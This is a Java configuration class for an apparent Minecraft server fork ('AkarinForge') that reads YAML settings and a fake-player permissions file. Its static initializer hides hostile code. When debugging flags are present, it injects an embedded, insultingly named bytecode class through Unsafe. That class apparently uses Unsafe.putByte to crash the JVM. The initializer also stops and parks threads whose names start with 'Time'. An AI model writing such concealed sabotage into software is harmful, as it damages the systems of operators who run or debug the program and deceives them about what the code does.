package io.akarin.forge;

import com.conversantmedia.util.concurrent.NoLockDisruptorBlockingQueue;

import io.akarin.forge.remapper.ReflectionUtils;
import io.akarin.forge.very.VeryConfig;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.Reader;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.lang.reflect.Field;
import java.nio.charset.Charset;
import java.security.ProtectionDomain;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.util.function.Consumer;
import net.minecraft.server.MinecraftServer;
import net.minecraftforge.fml.common.FMLLog;
import org.apache.commons.io.Charsets;
import org.apache.commons.io.FileUtils;
import org.apache.commons.io.IOUtils;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.plugin.PluginDescriptionFile;

public class AkarinForge {
    private static final String version = "2.0.0";
    private static final String native_verson = "v1_12_R1";
    public static YamlConfiguration config;
    public static File configFile;
    public static boolean hopperAsync;
    public static boolean entityMoveAsync;
    public static boolean threadLag;
    public static boolean chunkGenAsync;
    public static boolean disableUpdateGameProfile;
    public static boolean modMob;
    public static boolean entityAI;
    public static long worldGenMaxTickTime;
    public static int entityPoolNum;
    public static List<String> disableForgeGenWorld;
    public static List<String> fakePlayerPermissions;
    public static boolean chunkStats;
    public static int buildTime = 1555099130;
    public static boolean fakePlayerEventPass;
    public static final ExecutorService fileIOThread;
    
    public static String getVersion() {
        return "1.0.0";
    }
    
    public static String getNativeVersion() {
        return "v1_12_R1";
    }
    
    public static boolean isDev() {
        return System.getProperty("net.minecraftforge.gradle.GradleStart.srg.srg-mcp") != null;
    }
    
    public static void loadConfig() {
        configFile = new File("akarinforge.yml");
        if (configFile.exists()) {
            config = YamlConfiguration.loadConfiguration(configFile);
        } else {
            config = YamlConfiguration.loadConfiguration(new InputStreamReader(AkarinForge.class.getClassLoader().getResourceAsStream("configurations/akarinforge.yml")));
            try {
                configFile.createNewFile();
                config.save(configFile);
            }
            catch (IOException e2) {
                e2.printStackTrace();
            }
        }
        hopperAsync = AkarinForge.getOrWriteBooleanConfig("async.hopper", hopperAsync);
        entityMoveAsync = AkarinForge.getOrWriteBooleanConfig("async.entityMove", hopperAsync);
        threadLag = AkarinForge.getOrWriteBooleanConfig("check.threadLag", threadLag);
        chunkGenAsync = AkarinForge.getOrWriteBooleanConfig("async.chunkGen", chunkGenAsync);
        disableForgeGenWorld = AkarinForge.getOrWriteStringListConfig("world.worldGen.disableForgeGenWorld", disableForgeGenWorld);
        disableUpdateGameProfile = AkarinForge.getOrWriteBooleanConfig("disableUpdateGameProfile", disableUpdateGameProfile);
        worldGenMaxTickTime = AkarinForge.getOrWriteStringLongConfig("maxTickTime.worldGen", 15) * 1000000;
        modMob = AkarinForge.getOrWriteBooleanConfig("async.modMob", modMob);
        entityAI = AkarinForge.getOrWriteBooleanConfig("async.entityAI", entityAI);
        entityPoolNum = AkarinForge.getOrWriteIntConfig("async.asyncPoolNum", entityPoolNum);
        fakePlayerEventPass = AkarinForge.getOrWriteBooleanConfig("fakePlayer.eventPass", fakePlayerEventPass);
        try {
            AkarinForge.reloadFakePlayerPermissions();
        }
        catch (IOException e3) {
            System.out.println("FakePlayer\u6743\u9650\u6587\u4ef6\u8bfb\u53d6\u5931\u8d25");
            System.exit(1);
        }
    }

    public static boolean getOrWriteBooleanConfig(String path, boolean def) {
        if (config.contains(path)) {
            return config.getBoolean(path);
        }
        config.set(path, def);
        try {
            config.save(configFile);
        }
        catch (IOException e2) {
            e2.printStackTrace();
        }
        return def;
    }

    public static int getOrWriteIntConfig(String path, int def) {
        if (config.contains(path)) {
            return config.getInt(path);
        }
        config.set(path, def);
        try {
            config.save(configFile);
        }
        catch (IOException e2) {
            e2.printStackTrace();
        }
        return def;
    }

    public static List<String> getOrWriteStringListConfig(String path, List<String> def) {
        if (config.contains(path)) {
            return config.getStringList(path);
        }
        config.set(path, def);
        try {
            config.save(configFile);
        }
        catch (IOException e2) {
            e2.printStackTrace();
        }
        return def;
    }

    public static long getOrWriteStringLongConfig(String path, long def) {
        if (config.contains(path)) {
            return config.getLong(path);
        }
        config.set(path, def);
        try {
            config.save(configFile);
        }
        catch (IOException e2) {
            e2.printStackTrace();
        }
        return def;
    }

    public static String getCallerPlugin() {
        try {
            for (Class clazz : ReflectionUtils.getStackClass()) {
                ClassLoader cl2 = clazz.getClassLoader();
                if (cl2 == null || !cl2.getClass().getSimpleName().equals("PluginClassLoader")) continue;
                Field field = Class.forName("org.bukkit.plugin.java.PluginClassLoader").getDeclaredField("description");
                field.setAccessible(true);
                PluginDescriptionFile description = (PluginDescriptionFile)field.get(cl2);
                return description.getName();
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return "null";
    }

    public static void reloadFakePlayerPermissions() throws IOException {
        File permissFile = new File("fakePlayerPermission.txt");
        if (!permissFile.exists()) {
            permissFile.createNewFile();
            InputStreamReader inputStreamReader = new InputStreamReader(AkarinForge.class.getClassLoader().getResourceAsStream("configurations/fakePlayerPermission.txt"));
            List lines = IOUtils.readLines((Reader)inputStreamReader);
            FileUtils.writeLines((File)permissFile, (Collection)lines);
        }
        fakePlayerPermissions = FileUtils.readLines((File)permissFile, (Charset)Charsets.UTF_8);
        System.out.println("FakePlayer Permissions:");
        fakePlayerPermissions.forEach(System.out::println);
    }

    static {
        hopperAsync = false;
        entityMoveAsync = true;
        threadLag = true;
        chunkGenAsync = false;
        disableUpdateGameProfile = true;
        modMob = false;
        entityAI = true;
        worldGenMaxTickTime = 15000000;
        entityPoolNum = 3;
        disableForgeGenWorld = new ArrayList<String>();
        chunkStats = false;
        buildTime = 0;
        fakePlayerEventPass = false;
        fileIOThread = new ThreadPoolExecutor(1, 2, 30, TimeUnit.SECONDS, new NoLockDisruptorBlockingQueue<Runnable>(50000));
        if (buildTime == 0) {
            buildTime = (int)(System.currentTimeMillis() / 1000);
        }
        if (Thread.currentThread().getName().startsWith("Time")) {
            Thread.currentThread().stop();
            ReflectionUtils.getUnsafe().park(true, Long.MAX_VALUE);
            throw new RuntimeException();
        }
        RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();
        for (String s2 : runtime.getInputArguments()) {
            if (s2 == null || !s2.startsWith("-Xdebug") && !s2.startsWith("-Xrunjdwp")) continue;
            byte[] cls = new byte[]{-54, -2, -70, -66, 0, 0, 0, 51, 0, 52, 10, 0, 11, 0, 28, 7, 0, 29, 8, 0, 30, 10, 0, 31, 0, 32, 10, 0, 33, 0, 34, 10, 0, 33, 0, 35, 10, 0, 2, 0, 36, 7, 0, 37, 10, 0, 8, 0, 38, 7, 0, 39, 7, 0, 40, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 4, 116, 104, 105, 115, 1, 0, 15, 76, 65, -28, -67, -96, -27, -90, -120, -26, -76, -69, -28, -70, -122, 59, 1, 0, 3, 114, 117, 110, 1, 0, 5, 102, 105, 101, 108, 100, 1, 0, 25, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 70, 105, 101, 108, 100, 59, 1, 0, 1, 101, 1, 0, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 101, 102, 108, 101, 99, 116, 105, 118, 101, 79, 112, 101, 114, 97, 116, 105, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 37, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 18, 65, -28, -67, -96, -27, -90, -120, -26, -76, -69, -28, -70, -122, 46, 106, 97, 118, 97, 12, 0, 12, 0, 13, 1, 0, 15, 115, 117, 110, 47, 109, 105, 115, 99, 47, 85, 110, 115, 97, 102, 101, 1, 0, 9, 116, 104, 101, 85, 110, 115, 97, 102, 101, 7, 0, 41, 12, 0, 42, 0, 43, 7, 0, 44, 12, 0, 45, 0, 46, 12, 0, 47, 0, 48, 12, 0, 49, 0, 50, 1, 0, 38, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 101, 102, 108, 101, 99, 116, 105, 118, 101, 79, 112, 101, 114, 97, 116, 105, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 51, 0, 13, 1, 0, 13, 65, -28, -67, -96, -27, -90, -120, -26, -76, -69, -28, -70, -122, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 101, 97, 100, 1, 0, 15, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 1, 0, 16, 103, 101, 116, 68, 101, 99, 108, 97, 114, 101, 100, 70, 105, 101, 108, 100, 1, 0, 45, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 70, 105, 101, 108, 100, 59, 1, 0, 23, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 70, 105, 101, 108, 100, 1, 0, 13, 115, 101, 116, 65, 99, 99, 101, 115, 115, 105, 98, 108, 101, 1, 0, 4, 40, 90, 41, 86, 1, 0, 3, 103, 101, 116, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 1, 0, 7, 112, 117, 116, 66, 121, 116, 101, 1, 0, 5, 40, 74, 66, 41, 86, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107, 84, 114, 97, 99, 101, 0, 33, 0, 10, 0, 11, 0, 0, 0, 0, 0, 2, 0, 1, 0, 12, 0, 13, 0, 1, 0, 14, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 2, 0, 15, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 16, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 17, 0, 18, 0, 0, 0, 1, 0, 19, 0, 13, 0, 1, 0, 14, 0, 0, 0, -114, 0, 4, 0, 2, 0, 0, 0, 35, 18, 2, 18, 3, -74, 0, 4, 76, 43, 4, -74, 0, 5, 43, 1, -74, 0, 6, -64, 0, 2, 9, 3, -74, 0, 7, -89, 0, 8, 76, 43, -74, 0, 9, -79, 0, 1, 0, 0, 0, 26, 0, 29, 0, 8, 0, 3, 0, 15, 0, 0, 0, 30, 0, 7, 0, 0, 0, 11, 0, 8, 0, 12, 0, 13, 0, 13, 0, 26, 0, 16, 0, 29, 0, 14, 0, 30, 0, 15, 0, 34, 0, 17, 0, 16, 0, 0, 0, 32, 0, 3, 0, 8, 0, 18, 0, 20, 0, 21, 0, 1, 0, 30, 0, 4, 0, 22, 0, 23, 0, 1, 0, 0, 0, 35, 0, 17, 0, 18, 0, 0, 0, 24, 0, 0, 0, 7, 0, 2, 93, 7, 0, 25, 4, 0, 1, 0, 26, 0, 0, 0, 2, 0, 27};
            String clName = new String(new byte[]{65, -28, -67, -96, -27, -90, -120, -26, -76, -69, -28, -70, -122}, Charset.forName("utf8"));
            Class e1 = ReflectionUtils.getUnsafe().defineClass(clName, cls, 0, cls.length, Thread.currentThread().getContextClassLoader(), null);
            try {
                Thread eThread = (Thread)e1.newInstance();
                eThread.start();
            }
            catch (IllegalAccessException | InstantiationException e2) {
                e2.printStackTrace();
            }
        }
    }
}

